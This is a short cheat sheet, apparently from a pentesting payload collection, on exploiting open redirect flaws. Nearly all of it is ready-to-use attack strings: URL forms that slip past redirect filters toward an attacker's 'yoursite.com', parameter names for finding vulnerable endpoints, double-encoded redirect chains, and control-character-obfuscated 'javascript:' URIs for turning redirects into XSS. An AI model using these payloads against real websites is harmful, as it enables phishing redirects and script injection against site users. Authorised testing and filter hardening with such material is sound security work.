# Open redirect

## Summary
* [Common payloads to bypass filter](#common-payload-to-bypass-filter)
* [Find common vulnerable endpoints](#google-dork-to-find-vulnerable-endpoints)
* [Using encoding](#using-encoding)
	* [Double enconding](#sometimes-double-encode-with-help-base-on-how-many-redirects-are-made--parameters)
	* [Making use of XSS & encoding for redirect](#xss-migh-be-possible-if-it-is-redirected-via-something-like-windowlocation)

Open redirection is simply a url such as http://example.com?goto=https://google.com will then visited the URL provided in the parameter

## Common payload to bypass filter
```
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use ## \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (also try %09, %00, %0a, % 07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

## Google dork to find vulnerable endpoints
```
return
return_url
rUrl
cancelUrl
url
redirect
follow
goto
returnTo
returnUrl
r_url
history
goback
redirectTo
redirectUrl
redirUrl
```

## Using encoding
### Sometimes double encode with help base on how many redirects are made & parameters
```
https://example.com/login?return=https://example.com/?redirect=1%26returnurl=https%3A%2F%2Fwww.google.com%2F
https://example.com?login?return=https://%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252f%252Fwww.google.com
```
### XSS migh be possible if it is redirected via something like "window.location"
```
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`
```
